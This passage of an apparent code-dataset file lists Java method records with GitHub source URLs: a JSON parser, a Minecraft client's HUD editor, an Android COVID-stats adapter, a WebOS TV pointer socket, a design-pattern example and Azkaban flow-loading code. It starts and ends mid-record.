checkExpectToken(tokenType, expectToken);\n                    tokens.back();\n                    JSONObject.put(key, parseJSONObject(tokens));\n                    expectToken = TokenType.calcCode(SEP_COMMA, END_OBJECT);\n                    break;\n                case END_OBJECT:\n                case END_DOCUMENT:\n                    checkExpectToken(tokenType, expectToken);\n                    return JSONObject;\n                case BEGIN_ARRAY:\n                    checkExpectToken(tokenType, expectToken);\n                    tokens.back();\n                    JSONObject.put(key, parseJSONArray(tokens));\n                    expectToken = TokenType.calcCode(SEP_COMMA, END_OBJECT);\n                    break;\n                case NULL:\n                    checkExpectToken(tokenType, expectToken);\n                    JSONObject.put(key, null);\n                    expectToken = TokenType.calcCode(SEP_COMMA, END_OBJECT);\n                    break;\n                case NUMBER:\n                    checkExpectToken(tokenType, expectToken);\n                    if (tokenValue.contains(\".\") || tokenValue.contains(\"e\") || tokenValue.contains(\"E\")) {\n                        JSONObject.put(key, Double.valueOf(tokenValue));\n                    } else {\n                        long num = Long.parseLong(tokenValue);\n                        if (num > Integer.MAX_VALUE || num < Integer.MIN_VALUE) {\n                            JSONObject.put(key, num);\n                        } else {\n                            JSONObject.put(key, (int) num);\n                        }\n                    }\n                    expectToken =TokenType.calcCode(SEP_COMMA, END_OBJECT);\n                    break;\n                case BOOLEAN:\n                    checkExpectToken(tokenType, expectToken);\n                    JSONObject.put(key, Boolean.valueOf(token.value()));\n                    expectToken = TokenType.calcCode(SEP_COMMA, END_OBJECT);\n                    break;\n                case STRING:\n                    checkExpectToken(tokenType, expectToken);\n                    Token preToken = tokens.peekPrevious();\n\n                    if (preToken.type() == SEP_COLON) {\n                        value = token.value();\n                        JSONObject.put(key, value);\n                        expectToken = TokenType.calcCode(SEP_COMMA, END_OBJECT);\n                    } else {\n                        key = token.value();\n                        expectToken = TokenType.calcCode(SEP_COLON);\n                    }\n                    break;\n                case SEP_COLON:\n                    checkExpectToken(tokenType, expectToken);\n                    expectToken = TokenType.calcCode(NULL, NUMBER, BOOLEAN,\n                            STRING, BEGIN_OBJECT, BEGIN_ARRAY);\n                    break;\n                case SEP_COMMA:\n                    checkExpectToken(tokenType, expectToken);\n                    expectToken = TokenType.calcCode(STRING);\n                    break;\n                default:\n                    throw new JSONParseException(\"Unexpected Token.\");\n            }\n        }\n\n        throw new JSONParseException(\"Parse error, invalid Token.\");\n    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/parser/JSONParser.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34021, "method_name": "parseJSONArray", "class_name": "JSONParser", "params": ["TokenList"], "throws": null, "modifiers": ["public"], "return_type": "JSONArray", "snippet": "    public JSONArray parseJSONArray(@NotNull TokenList tokens) {\n        if (tokens.next().type() != BEGIN_ARRAY) {\n            throw new JSONParseException(\"Parse error, invalid Token.\");\n        }\n\n        int expectToken = TokenType.calcCode(BEGIN_ARRAY, END_ARRAY, BEGIN_OBJECT,\n                NULL, NUMBER, BOOLEAN, STRING);\n        JSONArray array = new JSONArray();\n        while (tokens.hasMore()) {\n            Token token = tokens.next();\n            TokenType tokenType = token.type();\n            String tokenValue   = token.value();\n            switch (tokenType) {\n                case BEGIN_OBJECT:\n                    checkExpectToken(tokenType, expectToken);\n                    tokens.back();\n                    array.add(parseJSONObject(tokens));\n                    expectToken = TokenType.calcCode(SEP_COMMA, END_ARRAY);\n                    break;\n                case BEGIN_ARRAY:\n                    checkExpectToken(tokenType, expectToken);\n                    tokens.back();\n                    array.add(parseJSONArray(tokens));\n                    expectToken = TokenType.calcCode(SEP_COMMA, END_ARRAY);\n                    break;\n                case END_ARRAY:\n                case END_DOCUMENT:\n                    checkExpectToken(tokenType, expectToken);\n                    return array;\n                case NULL:\n                    checkExpectToken(tokenType, expectToken);\n                    array.add(null);\n                    expectToken = TokenType.calcCode(SEP_COMMA, END_ARRAY);\n                    break;\n                case NUMBER:\n                    checkExpectToken(tokenType, expectToken);\n                    if (tokenValue.contains(\".\") || tokenValue.contains(\"e\") || tokenValue.contains(\"E\")) {\n                        array.add(Double.valueOf(tokenValue));\n                    } else {\n                        long num = Long.parseLong(tokenValue);\n                        if (num > Integer.MAX_VALUE || num < Integer.MIN_VALUE) {\n                            array.add(num);\n                        } else {\n                            array.add((int) num);\n                        }\n                    }\n                    expectToken = TokenType.calcCode(SEP_COMMA, END_ARRAY);\n                    break;\n                case BOOLEAN:\n                    checkExpectToken(tokenType, expectToken);\n                    array.add(Boolean.valueOf(tokenValue));\n                    expectToken = TokenType.calcCode(SEP_COMMA, END_ARRAY);\n                    break;\n                case STRING:\n                    checkExpectToken(tokenType, expectToken);\n                    array.add(tokenValue);\n                    expectToken = TokenType.calcCode(SEP_COMMA, END_ARRAY);\n                    break;\n                case SEP_COMMA:\n                    checkExpectToken(tokenType, expectToken);\n                    expectToken = TokenType.calcCode(STRING, NULL, NUMBER, BOOLEAN,\n                            BEGIN_ARRAY, BEGIN_OBJECT);\n                    break;\n                default:\n                    throw new JSONParseException(\"Unexpected Token.\");\n            }\n        }\n\n        throw new JSONParseException(\"Parse error, invalid Token.\");\n    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/parser/JSONParser.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34022, "method_name": "checkExpectToken", "class_name": "JSONParser", "params": ["TokenType", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void checkExpectToken(@NotNull TokenType type, int expectToken) {\n        if ((type.code & expectToken) == 0) {\n            throw new JSONParseException(\"Parse error, invalid Token.\");\n        }\n    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/parser/JSONParser.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34023, "method_name": "drawScreen", "class_name": "GuiHud", "params": ["int", "int", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void drawScreen(int mx, int my, float p_drawScreen_3_) {\n        super.drawScreen(mx, my, p_drawScreen_3_);\n        if (scaledResolution == null) scaledResolution = new ScaledResolution(mc);\n        Mercury.INSTANCE.getHudManager().getValues().forEach(hudComponent -> {\n            if (hudComponent.isDragging()) {\n                hudComponent.setX(mx + hudComponent.getLastX());\n                hudComponent.setY(my + hudComponent.getLastY());\n            }\n            if (hudComponent.getX() < 0) {\n                hudComponent.setX(0);\n            }\n            if (hudComponent.getX() + hudComponent.getW() > new ScaledResolution(mc).getScaledWidth()) {\n                hudComponent.setX(new ScaledResolution(mc).getScaledWidth() - hudComponent.getW());\n            }\n            if (hudComponent.getY() < 0) {\n                hudComponent.setY(0);\n            }\n            if (hudComponent.getY() + hudComponent.getH() > new ScaledResolution(mc).getScaledHeight()) {\n                hudComponent.setY(new ScaledResolution(mc).getScaledHeight() - hudComponent.getH());\n            }\n            //RenderUtil.drawRect2(0, scaledResolution.getScaledHeight() / 2 - 0.5f, scaledResolution.getScaledWidth(), 1, 0xff000000);\n            //RenderUtil.drawRect2(scaledResolution.getScaledWidth() / 2 - 0.5f, 0, 1, scaledResolution.getScaledHeight(), 0xff000000);\n            if (hudComponent.isShown()) hudComponent.onDraw(new ScaledResolution(mc));\n\n            RenderUtil.drawRect2(hudComponent.getX(), hudComponent.getY(), hudComponent.getW(), hudComponent.getH(), hudComponent.isDragging() ? 0x95000000 : 0x80000000);\n\n            if (hudComponent.isLabelShown()) Menu.font.drawStringWithShadow(hudComponent.getLabel(), hudComponent.getX() + hudComponent.getW() / 2 - mc.fontRenderer.getStringWidth(hudComponent.getLabel()) / 2, hudComponent.getY() + hudComponent.getH() / 2 - mc.fontRenderer.FONT_HEIGHT / 2, new Color(255, 255, 255, 83).getRGB());\n        });\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/hudeditor/GuiHud.java", "stars": "12", "class_props": {"extends": "GuiScreen", "implements": null, "modifiers": ["public"]}}, {"id": 34024, "method_name": "keyTyped", "class_name": "GuiHud", "params": ["char", "int"], "throws": ["IOException"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void keyTyped(char p_keyTyped_1_, int p_keyTyped_2_) throws IOException {\n        super.keyTyped(p_keyTyped_1_, p_keyTyped_2_);\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/hudeditor/GuiHud.java", "stars": "12", "class_props": {"extends": "GuiScreen", "implements": null, "modifiers": ["public"]}}, {"id": 34025, "method_name": "mouseClicked", "class_name": "GuiHud", "params": ["int", "int", "int"], "throws": ["IOException"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void mouseClicked(int mx, int my, int p_mouseClicked_3_) throws IOException {\n        super.mouseClicked(mx, my, p_mouseClicked_3_);\n        Mercury.INSTANCE.getHudManager().getValues().forEach(hudComponent -> {\n            final boolean hovered = MouseUtil.withinBounds(mx, my, hudComponent.getX(), hudComponent.getY(), hudComponent.getW(), hudComponent.getH());\n            switch (p_mouseClicked_3_) {\n                case 0:\n                    if (hovered) {\n                        hudComponent.setDragging(true);\n                        hudComponent.setLastX(hudComponent.getX() - mx);\n                        hudComponent.setLastY(hudComponent.getY() - my);\n                    }\n                    break;\n                case 1:\n                    if (hovered)\n                        hudComponent.setShown(!hudComponent.isShown());\n                    break;\n                default:\n                    break;\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/hudeditor/GuiHud.java", "stars": "12", "class_props": {"extends": "GuiScreen", "implements": null, "modifiers": ["public"]}}, {"id": 34026, "method_name": "mouseReleased", "class_name": "GuiHud", "params": ["int", "int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void mouseReleased(int mx, int my, int p_mouseReleased_3_) {\n        super.mouseReleased(mx, my, p_mouseReleased_3_);\n        Mercury.INSTANCE.getHudManager().getValues().forEach(hudComponent -> {\n            if (p_mouseReleased_3_ == 0) {\n                if (hudComponent.isDragging()) {\n                    hudComponent.setDragging(false);\n                }\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/hudeditor/GuiHud.java", "stars": "12", "class_props": {"extends": "GuiScreen", "implements": null, "modifiers": ["public"]}}, {"id": 34027, "method_name": "onGuiClosed", "class_name": "GuiHud", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onGuiClosed() {\n        Mercury.INSTANCE.getHudManager().getValues().forEach(hudComponent -> {\n            if (hudComponent.isDragging()) {\n                hudComponent.setDragging(false);\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/hudeditor/GuiHud.java", "stars": "12", "class_props": {"extends": "GuiScreen", "implements": null, "modifiers": ["public"]}}, {"id": 34028, "method_name": "doesGuiPauseGame", "class_name": "GuiHud", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean doesGuiPauseGame() {\n        return false;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/hudeditor/GuiHud.java", "stars": "12", "class_props": {"extends": "GuiScreen", "implements": null, "modifiers": ["public"]}}, {"id": 34029, "method_name": "onCreateViewHolder", "class_name": "TopCountriesAdapter", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "TopCountriesAdapter", "snippet": "    public TopCountriesAdapter.ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {\n        View view = mInflater.inflate(R.layout.layout_top_countries, parent, false);\n        return new TopCountriesAdapter.ViewHolder(view);\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/adapter/TopCountriesAdapter.java", "stars": "2", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 34030, "method_name": "onBindViewHolder", "class_name": "TopCountriesAdapter", "params": ["TopCountriesAdapter", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBindViewHolder(@NonNull TopCountriesAdapter.ViewHolder holder, int position) {\n        dataStats.get(position);\n\n        countryNameText.setText(dataStats.get(position).getCountry());\n        positiveCovidText.setText(formatter.format(dataStats.get(position).getPostive()));\n        deathTotalText.setText(formatter.format(dataStats.get(position).getDeath()));\n        curedTotalText.setText(formatter.format(dataStats.get(position).getCured()));\n\n        if(position == 0 || position == 3){\n            layout.setBackgroundColor(context.getResources().getColor(R.color.bg_Green));\n        }else if(position == 1 || position == 4){\n            layout.setBackgroundColor(context.getResources().getColor(R.color.bg_Blue));\n        }else if(position == 2){\n            layout.setBackgroundColor(context.getResources().getColor(R.color.bg_Red));\n        }\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/adapter/TopCountriesAdapter.java", "stars": "2", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 34031, "method_name": "getItemCount", "class_name": "TopCountriesAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemCount() {\n        return dataStats.size();\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/adapter/TopCountriesAdapter.java", "stars": "2", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 34032, "method_name": "getItem", "class_name": "TopCountriesAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "DataStats", "snippet": "    public DataStats getItem(int id) {\n        return dataStats.get(id);\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/adapter/TopCountriesAdapter.java", "stars": "2", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 34033, "method_name": "connectPointer", "class_name": "WebOSTVMouseSocketConnection", "params": ["URI"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void connectPointer(URI uri) {\n        if (ws != null) {\n            ws.close();\n            ws = null;\n        }\n\n        ws = new WebSocketClient(uri) {\n\n            @Override\n            public void onOpen(ServerHandshake arg0) {\n                Log.d(\"PtrAndKeyboardFragment\", \"connected to \" + uri.toString());\n                if (listener != null) {\n                    listener.onConnected();\n                }\n            }\n\n            @Override\n            public void onMessage(String arg0) {\n            }\n\n            @Override\n            public void onError(Exception arg0) {\n            }\n\n            @Override\n            public void onClose(int arg0, String arg1, boolean arg2) {\n            }\n        };\n\n        ws.connect();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/webos/WebOSTVMouseSocketConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34034, "method_name": "disconnect", "class_name": "WebOSTVMouseSocketConnection", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void disconnect() {\n        if (ws != null) {\n            ws.close();\n            ws = null;\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/webos/WebOSTVMouseSocketConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34035, "method_name": "isConnected", "class_name": "WebOSTVMouseSocketConnection", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isConnected() {\n        if (ws == null) \n            System.out.println(\"ws is null\");\n        else if (ws.getReadyState() != READYSTATE.OPEN) {\n            System.out.println(\"ws state is not ready\");\n        }\n        return (ws != null) && (ws.getReadyState() == READYSTATE.OPEN);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/webos/WebOSTVMouseSocketConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34036, "method_name": "click", "class_name": "WebOSTVMouseSocketConnection", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void click() {\n        if (isConnected()) {\n            ws.send(\"type:click\\n\" + \"\\n\");\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/webos/WebOSTVMouseSocketConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34037, "method_name": "button", "class_name": "WebOSTVMouseSocketConnection", "params": ["ButtonType"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void button(ButtonType type) {\n        String keyName; \n        switch (type) {\n        case HOME:\n            keyName = \"HOME\";\n            break;\n        case BACK:\n            keyName = \"BACK\";\n            break;\n        case UP:\n            keyName = \"UP\";\n            break;\n        case DOWN:\n            keyName = \"DOWN\";\n            break;\n        case LEFT:\n            keyName = \"LEFT\";\n            break;\n        case RIGHT:\n            keyName = \"RIGHT\";\n            break;\n\n        default:\n            keyName = \"NONE\";\n            break;\n        }\n\n        button(keyName);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/webos/WebOSTVMouseSocketConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34038, "method_name": "button", "class_name": "WebOSTVMouseSocketConnection", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void button(String keyName) {\n        if (isConnected()) {\n            ws.send(\"type:button\\n\" + \"name:\" + keyName + \"\\n\" + \"\\n\");\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/webos/WebOSTVMouseSocketConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34039, "method_name": "move", "class_name": "WebOSTVMouseSocketConnection", "params": ["double", "double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void move(double dx, double dy) {\n        if (isConnected()) {\n            ws.send(\"type:move\\n\" + \"dx:\" + dx + \"\\n\" + \"dy:\" + dy + \"\\n\" + \"down:0\\n\" + \"\\n\");\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/webos/WebOSTVMouseSocketConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34040, "method_name": "move", "class_name": "WebOSTVMouseSocketConnection", "params": ["double", "double", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void move(double dx, double dy, boolean drag) {\n        if (isConnected()) {\n            ws.send(\"type:move\\n\" + \"dx:\" + dx + \"\\n\" + \"dy:\" + dy + \"\\n\" + \"down:\" + (drag ? 1 : 0) + \"\\n\" + \"\\n\");\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/webos/WebOSTVMouseSocketConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34041, "method_name": "scroll", "class_name": "WebOSTVMouseSocketConnection", "params": ["double", "double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void scroll(double dx, double dy) {\n        if (isConnected()) {\n            ws.send(\"type:scroll\\n\" + \"dx:\" + dx + \"\\n\" + \"dy:\" + dy + \"\\n\" + \"\\n\");\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/webos/WebOSTVMouseSocketConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34042, "method_name": "makeCourse", "class_name": "AbstractCourse", "params": [], "throws": null, "modifiers": ["final", "protected"], "return_type": "void", "snippet": "    protected final void makeCourse(){\n        this.makePPT();\n        this.makeVideo();\n        if(isWriteNote()){\n            this.writeNote();\n        }\n        this.packageCourse();\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/templatemethod/AbstractCourse.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34043, "method_name": "makeVideo", "class_name": "AbstractCourse", "params": [], "throws": null, "modifiers": ["final"], "return_type": "void", "snippet": "    final void makeVideo(){\n        System.out.println(\"\u5236\u4f5c\u89c6\u9891\");\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/templatemethod/AbstractCourse.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34044, "method_name": "makePPT", "class_name": "AbstractCourse", "params": [], "throws": null, "modifiers": ["final"], "return_type": "void", "snippet": "    final void makePPT(){\n        System.out.println(\"\u5236\u4f5cPPT\");\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/templatemethod/AbstractCourse.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34045, "method_name": "writeNote", "class_name": "AbstractCourse", "params": [], "throws": null, "modifiers": ["final"], "return_type": "void", "snippet": "    final void writeNote(){\n        System.out.println(\"\u7f16\u5199\u7b14\u8bb0\");\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/templatemethod/AbstractCourse.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34046, "method_name": "isWriteNote", "class_name": "AbstractCourse", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean isWriteNote(){\n        return false;\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/templatemethod/AbstractCourse.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34047, "method_name": "packageCourse", "class_name": "AbstractCourse", "params": [], "throws": null, "modifiers": ["abstract"], "return_type": "void", "snippet": "    abstract void packageCourse();\n}\n\n", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/templatemethod/AbstractCourse.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34048, "method_name": "getFlowMap", "class_name": "DirectoryFlowLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,Flow>", "snippet": "  public Map<String, Flow> getFlowMap() {\n    return this.flowMap;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/DirectoryFlowLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["FlowLoader"], "modifiers": ["public"]}}, {"id": 34049, "method_name": "getErrors", "class_name": "DirectoryFlowLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Set<String>", "snippet": "  public Set<String> getErrors() {\n    return this.errors;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/DirectoryFlowLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["FlowLoader"], "modifiers": ["public"]}}, {"id": 34050, "method_name": "getJobPropsMap", "class_name": "DirectoryFlowLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "HashMap<String,Props>", "snippet": "  public HashMap<String, Props> getJobPropsMap() {\n    return this.jobPropsMap;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/DirectoryFlowLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["FlowLoader"], "modifiers": ["public"]}}, {"id": 34051, "method_name": "getPropsList", "class_name": "DirectoryFlowLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<Props>", "snippet": "  public ArrayList<Props> getPropsList() {\n    return this.propsList;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/DirectoryFlowLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["FlowLoader"], "modifiers": ["public"]}}, {"id": 34052, "method_name": "loadProjectFlow", "class_name": "DirectoryFlowLoader", "params": ["Project", "File"], "throws": null, "modifiers": ["public"], "return_type": "ValidationReport", "snippet": "  public ValidationReport loadProjectFlow(final Project project, final File projectDir) {\n    this.propsList = new ArrayList<>();\n    this.flowPropsList = new ArrayList<>();\n    this.jobPropsMap = new HashMap<>();\n    this.nodeMap = new HashMap<>();\n    this.duplicateJobs = new HashSet<>();\n    this.nodeDependencies = new HashMap<>();\n    this.rootNodes = new HashSet<>();\n    this.flowDependencies = new HashMap<>();\n\n    // Load all the props files and create the Node objects\n    loadProjectFromDir(projectDir.getPath(), projectDir, null);\n\n    // Create edges and find missing dependencies\n    resolveDependencies();\n\n    // Create the flows.\n    buildFlowsFromDependencies();\n\n    // Resolve embedded flows\n    resolveEmbeddedFlows();\n\n    FlowLoaderUtils.checkJobProperties(project.getId(), this.props, this.jobPropsMap, this.errors);\n\n    return FlowLoaderUtils.generateFlowLoaderReport(this.errors);\n\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/DirectoryFlowLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["FlowLoader"], "modifiers": ["public"]}}, {"id": 34053, "method_name": "loadProjectFromDir", "class_name": "DirectoryFlowLoader", "params": ["String", "File", "Props"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void loadProjectFromDir(final String base, final File dir, Props parent) {\n    final File[] propertyFiles = dir.listFiles(new SuffixFilter(PROPERTY_SUFFIX));\n    Arrays.sort(propertyFiles);\n\n    for (final File file : propertyFiles) {\n      final String relative = getRelativeFilePath(base, file.getPath());\n      try {\n        parent = new Props(parent, file);\n        parent.setSource(relative);\n\n        final FlowProps flowProps = new FlowProps(parent);\n        this.flowPropsList.add(flowProps);\n      } catch (final IOException e) {\n        this.errors.add(\"Error loading properties \" + file.getName() + \":\"\n            + e.getMessage());\n      }\n\n      this.logger.info(\"Adding \" + relative);\n      this.propsList.add(parent);\n    }\n\n    // Load all Job files. If there's a duplicate name, then we don't load\n    final File[] jobFiles = dir.listFiles(new SuffixFilter(JOB_SUFFIX));\n    for (final File file : jobFiles) {\n      final String jobName = getNameWithoutExtension(file);\n      try {\n        if (!this.duplicateJobs.contains(jobName)) {\n          if (this.jobPropsMap.containsKey(jobName)) {\n            this.errors.add(\"Duplicate job names found '\" + jobName + \"'.\");\n            this.duplicateJobs.add(jobName);\n            this.jobPropsMap.remove(jobName);\n            this.nodeMap.remove(jobName);\n          } else {\n            final Props prop = new Props(parent, file);\n            final String relative = getRelativeFilePath(base, file.getPath());\n            prop.setSource(relative);\n\n            final Node node = new Node(jobName);\n            final String type = prop.getString(\"type\", null);\n            if (type == null) {\n              this.errors.add(\"Job doesn't have type set '\" + jobName + \"', please check whether the file encoding is UNIX, UTF-8.\");\n            }\n\n            node.setType(type);\n\n            final String outer = prop.getString(\"outer\", null);\n            if (outer != null) {\n              node.setOuter(outer);\n            }\n\n            node.setJobSource(relative);\n            if (parent != null) {\n              node.setPropsSource(parent.getSource());\n            }\n\n            // Force root node\n            if (prop.getBoolean(CommonJobProperties.ROOT_NODE, false)) {\n              this.rootNodes.add(jobName);\n            }\n\n            this.jobPropsMap.put(jobName, prop);\n            this.nodeMap.put(jobName, node);\n          }\n        }\n      } catch (final IOException e) {\n        this.errors.add(\"Error loading job file \" + file.getName() + \":\"\n            + e.getMessage());\n      }\n    }\n\n    for (final File file : dir.listFiles(new DirFilter())) {\n      loadProjectFromDir(base, file, parent);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/DirectoryFlowLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["FlowLoader"], "modifiers": ["public"]}}, {"id": 34054, "method_name": "resolveEmbeddedFlows", "class_name": "DirectoryFlowLoader", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void resolveEmbeddedFlows() {\n    for (final String flowId : this.flowDependencies.keySet()) {\n      final HashSet<String> visited = new HashSet<>();\n      resolveEmbeddedFlow(flowId, visited);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/DirectoryFlowLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["FlowLoader"], "modifiers": ["public"]}}, {"id": 34055, "method_name": "resolveEmbeddedFlow", "class_name": "DirectoryFlowLoader", "params": ["String", "Set<String>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void resolveEmbeddedFlow(final String flowId, final Set<String> visited) {\n    final Set<String> embeddedFlow = this.flowDependencies.get(flowId);\n    if (embeddedFlow == null) {\n      return;\n    }\n\n    visited.add(flowId);\n    for (final String embeddedFlowId : embeddedFlow) {\n      if (visited.contains(embeddedFlowId)) {\n        this.errors.add(\"Embedded flow cycle found in \" + flowId + \"->\"\n            + embeddedFlowId);\n        return;\n      } else if (!this.flowMap.containsKey(embeddedFlowId)) {\n        this.errors.add(\"Flow \" + flowId + \" depends on \" + embeddedFlowId\n            + \" but can't be found.\");\n        return;\n      } else {\n        resolveEmbeddedFlow(embeddedFlowId, visited);\n      }\n    }\n\n    visited.remove(flowId);\n  }", "url": 